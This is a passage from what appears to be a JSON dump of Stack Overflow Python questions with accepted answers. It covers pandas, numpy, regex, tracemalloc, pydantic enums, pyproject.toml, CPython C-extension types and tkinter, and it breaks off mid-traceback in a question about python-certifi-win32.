dicitionary\n      2 dict1 = {\"x\": [1, 2, 3],\n      3          \"y\": np.array(\n      4              [\n   (...)\n      9              ),\n     10          \"z\": 100}\n---> 12 df1 = pd.DataFrame(dict1)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\frame.py:636, in DataFrame.__init__(self, data, index, columns, dtype, copy)\n    630     mgr = self._init_mgr(\n    631         data, axes={\"index\": index, \"columns\": columns}, dtype=dtype, copy=copy\n    632     )\n    634 elif isinstance(data, dict):\n    635     # GH#38939 de facto copy defaults to False only in non-dict cases\n--> 636     mgr = dict_to_mgr(data, index, columns, dtype=dtype, copy=copy, typ=manager)\n    637 elif isinstance(data, ma.MaskedArray):\n    638     import numpy.ma.mrecords as mrecords\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:502, in dict_to_mgr(data, index, columns, dtype, typ, copy)\n    494     arrays = [\n    495         x\n    496         if not hasattr(x, \"dtype\") or not isinstance(x.dtype, ExtensionDtype)\n    497         else x.copy()\n    498         for x in arrays\n    499     ]\n    500     # TODO: can we get rid of the dt64tz special case above?\n--> 502 return arrays_to_mgr(arrays, columns, index, dtype=dtype, typ=typ, consolidate=copy)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:120, in arrays_to_mgr(arrays, columns, index, dtype, verify_integrity, typ, consolidate)\n    117 if verify_integrity:\n    118     # figure out the index, if necessary\n    119     if index is None:\n--> 120         index = _extract_index(arrays)\n    121     else:\n    122         index = ensure_index(index)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:661, in _extract_index(data)\n    659         raw_lengths.append(len(val))\n    660     elif isinstance(val, np.ndarray) and val.ndim > 1:\n--> 661         raise ValueError(\"Per-column arrays must each be 1-dimensional\")\n    663 if not indexes and not raw_lengths:\n    664     raise ValueError(\"If using all scalar values, you must pass an index\")\n\nValueError: Per-column arrays must each be 1-dimensional\n\nWhy is it ending in error like that in the second attempt, even though the dimensions of both arrays are the same? What is a workaround for this issue?\n",
    "AcceptedAnswerId": 71580136,
    "AcceptedAnswer": "If you look closer at the error message and quick look at the source code here:\n    elif isinstance(val, np.ndarray) and val.ndim > 1:\n        raise ValueError(\"Per-column arrays must each be 1-dimensional\")\n\nYou will find that if the dictionay value is a numpy array and has more than one dimension as your example, it throws an error based on the source code. Therefore, it works very well with list because a list has no more than one dimension even if it is a list of list.\nlst = [[1,2,3],[4,5,6],[7,8,9]]\nlen(lst) # print 3 elements or (3,) not (3,3) like numpy array.\n\nYou can try to use np.array([1,2,3]), it will work because number of dimensions is 1 and try:\narr = np.array([1,2,3])\nprint(arr.ndim)  # output is 1\n\nIf it is necessary to use numpy array inside a dictionary, you can use .tolist() to convert numpy array to a list.\n"
}
{
    "Id": 72002559,
    "PostTypeId": 1,
    "Title": "Converting object to dictionary key",
    "Body": "I was wondering if there is an easy way to essentially have multiple keys in a dictionary for one value. An example of what I would like to achieve is as following:\nclass test:\n    key=\"test_key\"\n    \n    def __str__(self):\n        return self.key\n\ntester = test()\n\ndictionary = {}\ndictionary[tester] = 1\n\nprint(dictionary[tester])\nprint(dictionary[\"test_key\"])\n\nwhere the output would be:\n>>> 1\n>>> 1\n\nWhat I'm looking for is a way to automatically convert the object to a string before its used as a key. Is this possible?\n",
    "AcceptedAnswerId": 72002684,
    "AcceptedAnswer": "Personally, I think it's better to explicitly cast the object to a string, e.g.\ndictionary[str(tester)] = 1\n\nThat being said, if you're really really REALLY sure you want to do this, define the __hash__ and __eq__ dunder methods. No need to create a new data structure or change the existing code outside of the class definition:\nclass test:\n    key=\"test_key\"\n    \n    def __hash__(self):\n        return hash(self.key)\n        \n    def __eq__(self, other):\n        if isinstance(other, str):\n            return self.key == other\n        return self.key == other.key\n    \n    def __str__(self):\n        return self.key\n\nThis will output:\n1\n1\n\n"
}
{
    "Id": 71583528,
    "PostTypeId": 1,
    "Title": "Python extracting string",
    "Body": "I have a dataframe where one of the columns which is in string format looks like this\n    filename\n 0  Machine02-2022-01-28_00-21-45.blf.424\n 1  Machine02-2022-01-28_00-21-45.blf.425\n 2  Machine02-2022-01-28_00-21-45.blf.426\n 3  Machine02-2022-01-28_00-21-45.blf.427\n 4  Machine02-2022-01-28_00-21-45.blf.428\n\nI want my column to look like this\n      filename\n 0    2022-01-28 00-21-45 424\n 1    2022-01-28 00-21-45 425\n 2    2022-01-28 00-21-45 426\n 3    2022-01-28 00-21-45 427\n 4    2022-01-28 00-21-45 428\n\nI tried this code\ndf['filename'] = df['filename'].str.extract(r\"(\\d{4}-\\d{1,2}-\\d{1,2})_(\\d{2}-\\d{2}-\\d{2}).*\\.(\\d+)\", r\"\\1 \\2 \\3\")\n\nI am getting this error, unsupported operand type(s) for &: 'str' and 'int'.\nCan anyone please tell me where I am doing wrong ?\n",
    "AcceptedAnswerId": 71583643,
    "AcceptedAnswer": "please try this:\ndf['filename'] = df['filename'].str.split('-',1).apply(lambda x:' '.join(x[1].split('_')).replace('.blf.',' '))\n\n"
}
{
    "Id": 71452013,
    "PostTypeId": 1,
    "Title": "Does Python not reuse memory here? What does tracemalloc's output mean?",
    "Body": "I create a list of a million int objects, then replace each with its negated value. tracemalloc reports 28 MB extra memory (28 bytes per new int object). Why? Does Python not reuse the memory of the garbage-collected int objects for the new ones? Or am I misinterpreting the tracemalloc results? Why does it say those numbers, what do they really mean here?\nimport tracemalloc\n\nxs = list(range(10**6))\ntracemalloc.start()\nfor i, x in enumerate(xs):\n    xs[i] = -x\nprint(tracemalloc.get_traced_memory())\n\nOutput (Try it online!):\n(27999860, 27999972)\n\nIf I replace xs[i] = -x with x = -x (so the new object rather than the original object gets garbage-collected), the output is a mere (56, 196) (try it). How does it make any difference which of the two objects I keep/lose?\nAnd if I do the loop twice, it still only reports (27992860, 27999972) (try it). Why not 56 MB? How is the second run any different for this than the first?\n",
    "AcceptedAnswerId": 71481334,
    "AcceptedAnswer": "Short Answer\ntracemalloc was started too late to track the inital block of memory, so it\ndidn't realize it was a reuse. In the example you gave, you free 27999860 bytes\nand allocate 27999860 bytes, but tracemalloc can't 'see' the free. Consider the\nfollowing, slightly modified example:\nimport tracemalloc\n\ntracemalloc.start()\n\nxs = list(range(10**6))\nprint(tracemalloc.get_traced_memory())\nfor i, x in enumerate(xs):\n    xs[i] = -x\nprint(tracemalloc.get_traced_memory())\n\nOn my machine (python 3.10, but same allocator), this displays:\n(35993436, 35993436)\n(36000576, 36000716)\n\nAfter we allocate xs, the system has allocated 35993436 bytes, and after we run\nthe loop we have a net total of 36000576. This shows that the memory usage isn't\nactually increasing by 28 Mb.\nWhy does it behave this way?\nTracemalloc works by overriding the standard internal methods for allocating\nwith tracemalloc_alloc, and the similar free and realloc methods. Taking a\npeek at the source:\nstatic void*\ntracemalloc_alloc(int use_calloc, void *ctx, size_t nelem, size_t elsize)\n{\n    PyMemAllocatorEx *alloc = (PyMemAllocatorEx *)ctx;\n    void *ptr;\n\n    assert(elsize == 0 || nelem <= SIZE_MAX / elsize);\n\n    if (use_calloc)\n        ptr = alloc->calloc(alloc->ctx, nelem, elsize);\n    else\n        ptr = alloc->malloc(alloc->ctx, nelem * elsize);\n    if (ptr == NULL)\n        return NULL;\n\n    TABLES_LOCK();\n    if (ADD_TRACE(ptr, nelem * elsize) < 0) {\n        /* Failed to allocate a trace for the new memory block */\n        TABLES_UNLOCK();\n        alloc->free(alloc->ctx, ptr);\n        return NULL;\n    }\n    TABLES_UNLOCK();\n    return ptr;\n}\n\nWe see that the new allocator does two things:\n1.) Call out to the \"old\" allocator to get memory\n2.) Add a trace to a special table, so we can track this memory\nIf we look at the associated free functions, it's very similar:\n1.) free the memory\n2.) Remove the trace from the table\nIn your example, you allocated xs before you called tracemalloc.start(), so\nthe trace records for this allocation are never put in the memory tracking\ntable. Therefore, when you call free on the initial array data, the traces aren't removed, and thus your weird allocation behavior.\nWhy is the total memory usage 36000000 bytes and not 28000000\nLists in python are weird. They're actually a list of pointer to individually\nallocated objects. Internally, they look like this:\ntypedef struct {\n    PyObject_HEAD\n    Py_ssize_t ob_size;\n\n    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */\n    PyObject **ob_item;\n\n    /* ob_item contains space for 'allocated' elements.  The number\n     * currently in use is ob_size.\n     * Invariants:\n     *     0 <= ob_size <= allocated\n     *     len(list) == ob_size\n     *     ob_item == NULL implies ob_size == allocated == 0\n     */\n    Py_ssize_t allocated;\n} PyListObject;\n\nPyObject_HEAD is a macro that expands to some header information all python\nvariables have. It is just 16 bytes, and contains pointers to type data.\nImportantly, a list of integers is actually a list of pointer to PyObjects\nthat happen to be ints. On the line xs = list(range(10**6)), we expect to\nallocate:\n\n1 PyListObject with internal size 1000000 -- true size:\n\nsizeof(PyObject_HEAD) + sizeof(PyObject *) * 1000000 + sizeof(Py_ssize_t)\n(     16 bytes      ) + (    8 bytes     ) * 1000000 + (     8 bytes    )\n8000024 bytes\n\n\n1000000 PyObject ints (A PyLongObject in the underlying implmentation)\n\n1000000 * sizeof(PyLongObject)\n1000000 * (     28 bytes     )\n28000000 bytes\n\nFor a grand total of 36000024 bytes. That number looks pretty farmiliar!\nWhen you overwrite a value in the array, your just freeing the old value, and updating the pointer in PyListObject->ob_item. This means the array structure is allocated once, takes up 8000024 bytes, and lives to the end of the program. Additionally, 1000000 Integer objects are each allocated, and references are put in the array. They take up the 28000000 bytes. One by one, they are deallocated, and then the memory is used to reallocate a new object in the loop. This is why multiple loops don't increase the amount of memory.\n"
}
{
    "Id": 71290699,
    "PostTypeId": 1,
    "Title": "Is it possible to connect to AuraDB with neomodel?",
    "Body": "Is it possible to connect to AuraDB with neomodel?\nAuraDB connection URI is like neo4j+s://xxxx.databases.neo4j.io.\nThis is not contained user/password information.\nHowever, connection config of neomodel is bolt and it is contained user/password information.\nconfig.DATABASE_URL = 'bolt://neo4j:password@localhost:7687'\n",
    "AcceptedAnswerId": 71311469,
    "AcceptedAnswer": "Connecting to neo4j Aura uses neo4j+s protocol so you need to use the provided uri by Aura.\nReference: https://neo4j.com/developer/python/#driver-configuration\nIn example below; you can set the database url by setting the userid and password along with the uri. It works for me so it should also work for you.\nfrom neomodel import config\n\nuser = 'neo4j'\npsw = 'awesome_password'\nuri = 'awesome.databases.neo4j.io'\n    \nconfig.DATABASE_URL = 'neo4j+s://{}:{}@{}'.format(user, psw, uri)\nprint(config.DATABASE_URL)\n\nResult: \n\n   neo4j+s://neo4j:awesome_password@awesome.databases.neo4j.io\n\n"
}
{
    "Id": 71669583,
    "PostTypeId": 1,
    "Title": "Is there a converse to `operator.contains`?",
    "Body": "edit: I changed the title from complement to converse after the discussion below.\nIn the operator module, the binary functions comparing objects take two parameters. But the contains function has them swapped.\nI use a list of operators, e.g. operator.lt, operator.ge.\nThey take 2 arguments, a and b.\nI can say operator.lt(a, b) and it will tell me whether a is less than b.\nBut with operator.contains, I want to know whether b contains a so I have to swap the arguments.\nThis is a pain because I want a uniform interface, so I can have a user defined list of operations to use (I'm implementing something like Django QL).\nI know I could create a helper function which swaps the arguments:\ndef is_contained_by(a, b):\n    return operator.contains(b, a)\n\nIs there a \"standard\" way to do it?\nAlternatively, I can implement everything backwards, except contains. So map lt to ge, etc, but that gets really confusing.\n",
    "AcceptedAnswerId": 71669777,
    "AcceptedAnswer": "If either of them posts an answer, you should accept that, but between users @chepner and @khelwood, they gave you most of the answer.\nThe complement of operator.contains would be something like operator.does_not_contain, so that's not what you're looking for exactly. Although I think a 'reflection' isn't quite what you're after either, since that would essentially be its inverse, if it were defined.\nAt any rate, as @chepner points out, contains is not backwards. It just not the same as in, in would be is_contained_by as you defined it.\nConsider that a in b would not be a contains b, but rather b contains a, so the signature of operator.contains makes sense. It follows the convention of the function's stated infix operation being its name. I.e. (a  and b contains a == operator.contains(b, a) == (a in b). (in a world where contains would be an existing infix operator)\nAlthough I wouldn't recommend it, because it may cause confusion with others reading your code and making the wrong assumptions, you could do something like:\noperator.in_ = lambda a, b: b.__contains__(a)\n# or\noperator.in_ = lambda a, b: operator.contains(b, a)\n\nThat would give you an operator.in_ that works as you expect (and avoids the in keyword), but at the cost of a little overhead and possible confusion. I'd recommend working with operator.contains instead.\n"
}
{
    "Id": 71486255,
    "PostTypeId": 1,
    "Title": "How can I make Python re work like grep for repeating groups?",
    "Body": "I have the following string:\nseq = 'MNRYLNRQRLYNMYRNKYRGVMEPMSRMTMDFQGRYMDSQGRMVDPRYYDHYGRMHDYDRYYGRSMFNQGHSMDSQRYGGWMDNPERYMDMSGYQMDMQGRWMDAQGRYNNPFSQMWHSRQGH'\n\nalso saved in a file called seq.dat. If I use the following grep command\ngrep '\\([MF]D.\\{4,6\\}\\)\\{3,10\\}' seq.dat\n\nI get the following matching string:\nMDNPERYMDMSGYQMDMQGRWMDAQGRYN\n\nwhich is what I want. In words, what I want to match is as many consecutive repeats as the string has of [MF]D.{4,6}. I don't want to match cases where it has less than 3 consecutive repeats, but I want it to be able to capture up to 6.\nNow, I'm trying to do this with python. I have\np = re.compile(\"(?:[MF]D.{4,6}){3,10}\")\n\nTrying search() returns\nMDNPERYMDMSGYQMDMQGRWM\n\nIt is the close to the answer I seek, but is still missing the last MDAQGRYN. I'm guessing this is because .{4,6} matches the M, which in turn prevents {3,10} from capturing this 4th occurence of ([MF]D.{4,6}), but since I asked for at least 3, it's happy and it stops.\nHow do I make Python regex behave like grep does?\n",
    "AcceptedAnswerId": 71487029,
    "AcceptedAnswer": "There is a fundamental difference between POSIX (\"text-directed\") and NFA (\"regex-directed\") engines. POSIX engines (grep here uses a POSIX BRE regex flavor, it is the flavor used by default) will parse the input text applying the regex to it and return the longest match possible. NFA engine (Python re engine is an NFA engine) here does not re-consume (backtrack) when the subsequent pattern parts match.\nSee reference on regex-directed and text-directed engines:\n\nA regex-directed engine walks through the regex, attempting to match the next token in the regex to the next character. If a match is found, the engine advances through the regex and the subject string. If a token fails to match, the engine backtracks to a previous position in the regex and the subject string where it can try a different path through the regex... Modern regex flavors using regex-directed engines have lots of features such as atomic grouping and possessive quantifiers that allow you to control this backtracking.\nA text-directed engine walks through the subject string, attempting all permutations of the regex before advancing to the next character in the string. A text-directed engine never backtracks. Thus, there isn\u2019t much to discuss about the matching process of a text-directed engine. In most cases, a text-directed engine finds the same matches as a regex-directed engine.\n\nThe last sentence says \"in most cases\", but not all cases, and yours is a good illustration that discrepances may occur.\nTo avoid consuming M or F that are immediately followed with D, I'd suggest using\n(?:[MF]D(?:(?![MF]D).){4,6}){3,10}\n\nSee the regex demo. Details:\n\n(?: - start of an outer non-capturing container group:\n\n[MF]D - M or F and then D\n(?:(?![MF]D).){4,6} - any char (other than a line break) repeated four to six times, that does not start an MD or FD char sequence\n\n\n){3,10} - end of the outer group, repeat 3 to 10 times.\n\nBy the way, if you only want to match uppercase ASCII letters, replace the . with [A-Z].\n"
}
{
    "Id": 71690992,
    "PostTypeId": 1,
    "Title": "Cannot install latest version of Numpy (1.22.3)",
    "Body": "I am trying to install the latest version of numpy, the 1.22.3, but it looks like pip is not able to find this last release.\nI know I can install it locally from the source code, but I want to understand why I cannot install it using pip.\nPS: I have the latest version of pip, the 22.0.4\nERROR: Could not find a version that satisfies the requirement numpy==1.22.3 (from versions: 1.3.0, 1.4.1, 1.5.0, 1.5.1, 1.6.0, 1.6.1, 1.6.2, 1.7.0, 1.7.1, 1.7.2, 1.8.0, 1.8.1, 1.8.2, 1.9.0, 1.9.1, 1.9.2, 1.9.3, 1.10.0.post2, 1.10.1, 1.10.2, 1.10.4, 1.11.0, 1.11.1, 1.11.2, 1.11.3, 1.12.0, 1.12.1, 1.13.0rc1, 1.13.0rc2, 1.13.0, 1.13.1, 1.13.3, 1.14.0rc1, 1.14.0, 1.14.1, 1.14.2, 1.14.3, 1.14.4, 1.14.5, 1.14.6, 1.15.0rc1, 1.15.0rc2, 1.15.0, 1.15.1, 1.15.2, 1.15.3, 1.15.4, 1.16.0rc1, 1.16.0rc2, 1.16.0, 1.16.1, 1.16.2, 1.16.3, 1.16.4, 1.16.5, 1.16.6, 1.17.0rc1, 1.17.0rc2, 1.17.0, 1.17.1, 1.17.2, 1.17.3, 1.17.4, 1.17.5, 1.18.0rc1, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.19.0rc1, 1.19.0rc2, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.20.0rc1, 1.20.0rc2, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.21.0rc1, 1.21.0rc2, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5)\nERROR: No matching distribution found for numpy==1.22.3\n\n",
    "AcceptedAnswerId": 71691188,
    "AcceptedAnswer": "Please check your Python version. Support for Python 3.7 is dropped since Numpy 1.22.0 release. [source]\n"
}
{
    "Id": 71178416,
    "PostTypeId": 1,
    "Title": "Can you safely change a Python object's type in a C extension?",
    "Body": "Question\nSuppose that I have implemented two Python types using the C extension API and that the types are identical (same data layouts/C struct) with the exception of their names and a few methods. Assuming that all methods respect the data layout, can you safely change the type of an object from one of these types into the other in a C function?\nNotably, as of Python 3.9, there appears to be a function Py_SET_TYPE, but the documentation is not clear as to whether/when this is safe to do. I'm interested in knowing both how to use this function safely and whether types can be safely changed prior to version 3.9.\nMotivation\nI'm writing a Python C extension to implement a Persistent Hash Array Mapped Trie (PHAMT); in case it's useful, the source code is here (as of writing, it is at this commit). A feature I would like to add is the ability to create a Transient Hash Array Mapped Trie (THAMT) from a PHAMT. THAMTs can be created from PHAMTs in O(1) time and can be mutated in-place efficiently. Critically, THAMTs have the exact same underlying C data-structure as PHAMTs\u2014the only real difference between a PHAMT and a THAMT is a few methods encapsulated by their Python types. This common structure allows one to very efficiently turn a THAMT back into a PHAMT once one has finished performing a set of edits. (This pattern typically reduces the number of memory allocations when performing a large number of updates to a PHAMT).\nA very convenient way to implement the conversion from THAMT to PHAMT would be to simply change the type pointers of the THAMT objects from the THAMT type to the PHAMT type. I am confident that I can write code that safely navigates this change, but I can imagine that doing so might, for example, break the Python garbage collector.\n(To be clear: the motivation is just context as to how the question arose. I'm not looking for help implementing the structures described in the Motivation, I'm looking for an answer to the Question, above.)\n",
    "AcceptedAnswerId": 71316603,
    "AcceptedAnswer": "The supported way\nIt is officially possible to change an object's type in Python, as long as the memory layouts are compatible... but this is mostly limited to types not implemented in C. With some restrictions, it is possible to do\n# Python attribute assignment, not C struct member assignment\nobj.__class__ = some_new_class\n\nto change an object's class, with one of the restrictions being that both the old and new classes must be \"heap types\", which all classes implemented in Python are and most classes implemented in C are not. (types.ModuleType and subclasses of that type are also specifically permitted, despite types.ModuleType not being a heap type. See the source for exact restrictions.)\nIf you want to create a heap type from C, you can, but the interface is pretty different from the normal way of defining Python types from C. Plus, for __class__ assignment to work, you have to not set the Py_TPFLAGS_IMMUTABLETYPE flag, and that means that people will be able to monkey-patch your classes in ways you might not like (or maybe you see that as an upside).\nIf you want to go that route, I suggest looking at the CPython 3.10 _functools module source code for an example. (They set the Py_TPFLAGS_IMMUTABLETYPE flag, which you'll have to make sure not to do.)\n\nThe unsupported way\nThere was an attempt at one point to allow __class__ assignment for non-heap types, as long as the memory layouts worked. It got abandoned because it caused problems with some built-in immutable types, where the interpreter likes to reuse instances. For example, allowing (1).__class__ = SomethingElse would have caused a lot of problems. You can read more in the big comment in the source code for the __class__ setter. (The comment is slightly out of date, particularly regarding the Py_TPFLAGS_IMMUTABLETYPE flag, which was added after the comment was written.)\nAs far as I know, this was the only problem, and I don't think any more problems have been added since then. The interpreter isn't going to aggressively reuse instances of your classes, so as long as you're not doing anything like that, and the memory layouts are compatible, I think changing the type of your objects should work for now, even for non-heap-types. However, it is not officially supported, so even if I'm right about this working for now, there's no guarantee it'll keep working.\nPy_SET_TYPE only sets an object's type pointer. It doesn't do any refcount fixing that might be needed. It's a very low-level operation. If neither the old class nor the new class are heap types, no extra refcount fixing is needed, but if the old class is a heap type, you will have to decref the old class, and if the new class is a heap type, you will have to incref the new class.\nIf you need to decref the old class, make sure to do it after changing the object's class and possibly incref'ing the new class.\n"
}
{
    "Id": 72071447,
    "PostTypeId": 1,
    "Title": "Python Enum and Pydantic : accept enum member's composition",
    "Body": "I have an enum :\nfrom enum import Enum\n\nclass MyEnum(Enum):\n    val1 = \"val1\"\n    val2 = \"val2\"\n    val3 = \"val3\"\n\nI would like to validate a pydantic field based on that enum.\nfrom pydantic import BaseModel\n\nclass MyModel(BaseModel):\n    my_enum_field: MyEnum\n\nBUT I would like this validation to also accept string that are composed by the Enum members.\nSo for example : \"val1_val2_val3\" or \"val1_val3\" are valid input.\nI cannot make this field as a string field with a validator since I use a test library (hypothesis and pydantic-factories) that needs this type in order to render one of the values from the enum (for mocking random inputs)\nSo this :\nfrom pydantic import BaseModel, validator\n\nclass MyModel(BaseModel):\n    my_enum_field: str\n\n    @validator('my_enum_field', pre=True)\n    def validate_my_enum_field(cls, value):\n        split_val = str(value).split('_')\n        if not all(v in MyEnum._value2member_map_ for v in split_val):\n            raise ValueError()\n        return value\n\nCould work, but break my test suites because the field is anymore of enum types.\nHow to keep this field as an Enum type (to make my mock structures still valid) and make pydantic accept composite values in the same time ?\nSo far, I tried to dynamically extend the enum, with no success.\n",
    "AcceptedAnswerId": 72072103,
    "AcceptedAnswer": "I looked at this a bit further, and I believe something like this could be helpful. You can create a new class to define the property that is a list of enum values.\nThis class can supply a customized validate method and supply a __modify_schema__ to keep the information present about being a string in the json schema.\nWe can define a base class for generic lists of concatenated enums like this:\nfrom typing import Generic, TypeVar, Type\nfrom enum import Enum\n\nT = TypeVar(\"T\", bound=Enum)\n\n\nclass ConcatenatedEnum(Generic[T], list[T]):\n    enum_type: Type[T]\n\n    @classmethod\n    def __get_validators__(cls):\n        yield cls.validate\n\n    @classmethod\n    def validate(cls, value: str):\n        return list(map(cls.enum_type, value.split(\"_\")))\n\n    @classmethod\n    def __modify_schema__(cls, field_schema: dict):\n        all_values = ', '.join(f\"'{ex.value}'\" for ex in cls.enum_type)\n        field_schema.update(\n            title=f\"Concatenation of {cls.enum_type.__name__} values\",\n            description=f\"Underscore delimited list of values {all_values}\",\n            type=\"string\",\n        )\n        if \"items\" in field_schema:\n            del field_schema[\"items\"]\n\nIn the __modify_schema__ method I also provide a way to generate a description of which values are valid.\nTo use this in your application:\nclass MyEnum(Enum):\n    val1 = \"val1\"\n    val2 = \"val2\"\n    val3 = \"val3\"\n\n\nclass MyEnumList(ConcatenatedEnum[MyEnum]):\n    enum_type = MyEnum\n\n\nclass MyModel(BaseModel):\n    my_enum_field: MyEnumList\n\nExamples Models:\nprint(MyModel.parse_obj({\"my_enum_field\": \"val1\"}))\nprint(MyModel.parse_obj({\"my_enum_field\": \"val1_val2\"}))\n\nmy_enum_field=[]\nmy_enum_field=[, ]\n\nExample Schema:\nprint(json.dumps(MyModel.schema(), indent=2))\n\n{\n  \"title\": \"MyModel\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"my_enum_field\": {\n      \"title\": \"Concatenation of MyEnum values\",\n      \"description\": \"Underscore delimited list of values 'val1', 'val2', 'val3'\",\n      \"type\": \"string\"\n    }\n  },\n  \"required\": [\n    \"my_enum_field\"\n  ]\n}\n\n"
}
{
    "Id": 71193095,
    "PostTypeId": 1,
    "Title": "Questions on pyproject.toml vs setup.py",
    "Body": "Reading up on pyproject.toml, python -m pip install, poetry, flit, etc - I have several questions regarding replacing setup.py with pyproject.toml.\nMy biggest question was - how does a toml file replace a setup.py. Meaning, a toml file can't do everything a py file can. Reading into it, poetry and flit completely replace setup.py with pyproject.toml. While pip uses the pyproject.toml to specify the build tools, but then still uses the setup.py for everything else.\nA good example is, pip currently doesn't have a way to do entry points for console script directly in a toml file, but poetry and flit do.\n\nhttps://flit.readthedocs.io/en/latest/pyproject_toml.html#scripts-section\nhttps://python-poetry.org/docs/pyproject/#scripts\n\nMy main question right now is;\nThe point of pyproject.toml is to provide build system requirement. It is a metadata file. So wouldn't the ideal solution to be to use this file only to specify the build system requirements and still leverage the setup.py for everything else.\nI am confused because I feel like we're losing a lot to over come a fairly simple problem. By entirely doing way with the setup.py and replacing it with pyproject.toml, we lose a lot of helpful things we can do in a setup.py. We can't use a __version.py__, and we lose the ability to automatically create a universal wheel and sdist and upload our packages to PyPi using Twine. which we can currently do in the setup.py file.\nI'm just having a had time wrapping my head around why we would want to completely replace the setup.py with a metadata only file. It seems like using them together is the best of both worlds. We solve the chicken and the egg build system issue, and we get to retain a lot of useful things the setup.py can do.\nWouldn't we need a setup.py to install in Dev mode anyway? Or maybe that is just a pip problem?\n",
    "AcceptedAnswerId": 71717788,
    "AcceptedAnswer": "Currently I am investigating this feature too. I found this experimental feature explanation of setuptools which should just refer to the pyproject.toml without any need of setup.py in the end.\nRegarding dynamic behavior of setup.py, I figured out that you can set a dynamic behavior for fields under the [project] metadata\ndynamic = [\"version\"]\n\n[tool.setuptools.dynamic]\nversion = {attr = \"my_package.__version__\"}\n\nwhereat the corresponding version in this example is set in, e.g. my_package.__init__.py\n__version__ = \"0.1.0\"\n\n__all__ = [\"__version__\"]\n\nIn the end, I guess that setuptools will cover the missing setup.py execution and places the necessary egg-links for the development mode.\n"
}
{
    "Id": 71292505,
    "PostTypeId": 1,
    "Title": "TK python checkbutton RTL",
    "Body": "I have a checkbutton:\nfrom tkinter import *\nmaster = Tk()\nCheckbutton(master, text=\"Here...\").grid(row=0, sticky=W)\nmainloop()\n\nWhich looks like this:\n\nI tried to move the checkbutton to the other side (to support RTL languages), so it'll be like:\nHere...[]\nI know that I can draw a label next to the checkbutton, but this way clicking the text won't effect the checkbutton.\nHow can I do it?\n",
    "AcceptedAnswerId": 71348390,
    "AcceptedAnswer": "You can bind the left mouse button click event of the label, to a lambda construct that toggles the checkbutton -:\nlabel.bind(\"\", lambda x : check_button.toggle())\n\nThe label can then be placed before the checkbutton using grid(as mentioned in the OP at the end) -:\nfrom tkinter import *\n\nmaster = Tk()\n\nl1 = Label(master, text = \"Here...\")\ncb = Checkbutton(master)\nl1.grid(row = 0, column = 0)\ncb.grid(row = 0, column = 1, sticky=W)\n\nl1.bind(\"\", lambda x : cb.toggle())\nmainloop()\n\nThis will toggle, the checkbutton even if the label is clicked.\nOUTPUT -:\n\n\nNOTE:\nThe checkbutton, has to now be fetched as an object(cb), to be used in the lambda construct for the label's bind function callback argument. Thus, it is gridded in the next line. It is generally a good practice to manage the geometry separately, which can prevent error such as this one.\n\nAlso, as mentioned in the post linked by @Alexander B. in the comments, if this assembly is to be used multiple times, it can also be made into a class of it's own that inherits from the tkinter.Frame class -:\nclass LabeledCheckbutton(Frame):\n    def __init__(self, root, text = \"\"):\n        Frame.__init__(self, root)\n        self.checkbutton = Checkbutton(self)\n        self.label = Label(self, text = text)\n        self.label.grid(row = 0, column = 0)\n        self.checkbutton.grid(row = 0, column = 1)\n        self.label.bind('', lambda x : self.checkbutton.toggle())\n        return\n    \n    pass\n\nUsing this with grid as the geometry manager, would make the full code look like this -:\nfrom tkinter import *\n\nclass LabeledCheckbutton(Frame):\n    def __init__(self, root, text = \"\"):\n        Frame.__init__(self, root)\n        self.checkbutton = Checkbutton(self)\n        self.label = Label(self, text = text)\n        self.label.grid(row = 0, column = 0)\n        self.checkbutton.grid(row = 0, column = 1)\n        self.label.bind('', lambda x : self.checkbutton.toggle())\n        return\n    \n    pass\n\nmaster = Tk()\nlcb = LabeledCheckbutton(master, text = \"Here...\")\nlcb.grid(row = 0, sticky = W)\n\nmainloop()\n\nThe output of the above code remains consistent with that of the first approach. The only difference is that it is now more easily scalable, as an object can be created whenever needed and the same lines of code need not be repeated every time.\n"
}
{
    "Id": 72011315,
    "PostTypeId": 1,
    "Title": "PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32",
    "Body": "I installed python-certifi-win32 package and after that, I am getting below error, when I import anything or pip install anything, the fail with the final error of PermissionError.\nI tried rebooting the box. It didn't work. I am unable to uninstall the package as pip is erroring out too.\nI am unable to figure out the exact reason why this error is happening. It doesn't seem to be code specific, seems related to the library I installed\nPS C:\\Users\\visha\\PycharmProjects\\master_test_runner> pip install python-certifi-win32                                                                \nTraceback (most recent call last):\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 89, in _tempfile\n    os.write(fd, reader())\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\abc.py\", line 371, in read_bytes\n    with self.open('rb') as strm:\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_adapters.py\", line 54, in open\n    raise ValueError()\nValueError\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\runpy.py\", line 196, in _run_module_as_main\n    return _run_code(code, main_globals, None,\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\runpy.py\", line 86, in _run_code\n    exec(code, run_globals)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\Scripts\\pip.exe\\__main__.py\", line 4, in \n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\main.py\", line 9, in \n    from pip._internal.cli.autocompletion import autocomplete\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\autocompletion.py\", line 10, in \n    from pip._internal.cli.main_parser import create_main_parser\n  File 